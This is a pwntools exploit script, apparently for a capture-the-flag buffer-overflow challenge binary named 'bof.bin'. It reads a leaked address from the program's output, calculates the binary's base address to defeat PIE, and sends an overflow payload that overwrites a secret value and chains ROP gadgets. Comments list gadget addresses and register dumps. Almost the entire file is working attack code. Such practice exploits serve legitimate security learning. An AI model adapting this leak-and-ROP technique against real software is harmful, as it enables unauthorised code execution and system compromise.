# =============================================================================

#!/usr/bin/python3
from pwn import *
context.log_level='debug'
import time
# =============================================================================

#   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
#   int secret = 0xdeadbeef;
#   if (secret == 0x67616c66) {
#   5015
#   pop edi; pop ebp; ret
#   7915
#   pop esi; pop ebp; ret
#   5037
#   pop eax; int3; ret
#   0x00001824 : mov eax, dword ptr [esp] ; ret
#   addr = next(binario.search(asm("int3")))
#   0x00001397 : pop edi ; pop ebp ; ret


elf = context.binary = ELF("bof.bin")
libc = elf.libc





# =============================================================================


gs = '''
break main
'''
# 

# =============================================================================


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def setColor():
    io.sendline(color)

# =============================================================================

#  EBX  0x43434343 ('CCCC')
#  EBP  0x44444444 ('DDDD')
#  ESP  0xffffd000 ◂— 'FFFFGGGGHHHHI*4JJJJ'
#  EIP  0x45454545 ('EEEE')
#  0xf7e5f078 : mov eax, ebx ; pop ebx ; ret
#  0xf7df09e8 : mov eax, 1 ; ret
# 0xf7e721f4 : xor eax, eax ; pop edi ; pop esi ; ret

#rop
# 0x00001396: pop esi; pop edi; pop ebp; ret; 
elf.symbols['pop_eax_int3'] = 0x13ad
elf.symbols['pop_esi_edi_ebp'] = 0x1396

exp=""
secret="flag"
pad1=b'A'*48
pad2=b'B'*12
buf=b'C'*4
# exp=pad1+bytes(secret,'utf-8')+pad2
# =============================================================================


io = start()
io.recvuntil('Do you want color in the visualization? (Y/n)')
# print('*'*80)
# time.sleep(0.25)
io.sendline('n')
time.sleep(1)
# print(io.recvuntil('Input some text: '))
leak=io.recvuntil('Input some text: ')
# time.sleep(1)
leak=leak.decode("utf-8")
# time.sleep(1)
leak=leak.split('\n')[-3][13:-2]
# time.sleep(1)
leak=leak.split(' ')[::-1]
# time.sleep(1)



# io.sendline("a")
strleak=""

for i in range(4,len(leak)):
    strleak+=leak[i]
leak=int("0x"+strleak,16)

#00001994  system bin cat flag
system=0x0001994
log.info('*****'*6)
log.info(hex(leak))
# exp=exp+p32(leak) leak-(0x569-0x444)-elfsym.main 0x4000
dif=(leak & 0xFFF)-(elf.sym.main & 0xFFF)
elf.address=leak-dif-elf.sym.main
# elf.address=leak+0x1599
log.info("0x1599 "+hex(leak+0x1599))
log.info("dif bin: "+hex(dif))
log.info("base bin: "+hex(elf.address))
log.info("pop edi esi ebp: "+hex(elf.sym.pop_esi_edi_ebp))
log.info("pop eax int3: "+hex(elf.sym.pop_eax_int3))
elf.symbols['shell'] = system
log.info("system obtengo con pwntools "+hex(elf.sym.shell+elf.address))
log.info("system obtengo con GDB "+hex(0x5655552f))
# exp=exp
# exp=exp+p32(elf.sym.pop_esi_edi_ebp)+p32(0x1337)+p32(0x31337)+p32(0xdeadba5e)+p32(elf.sym.pop_eax_int3)+p32(0x1)
exp=pad1+bytes(secret,'utf-8')+ pad2+p32(elf.sym.pop_esi_edi_ebp)+p32(0x1337)+p32(0x31337)+p32(0x5655552f)+p32(elf.sym.pop_eax_int3)+p32(1)+p32(0xdeadbeaf)
log.info(exp)
io.sendline(exp)


io.stream()

# =============================================================================



# =============================================================================


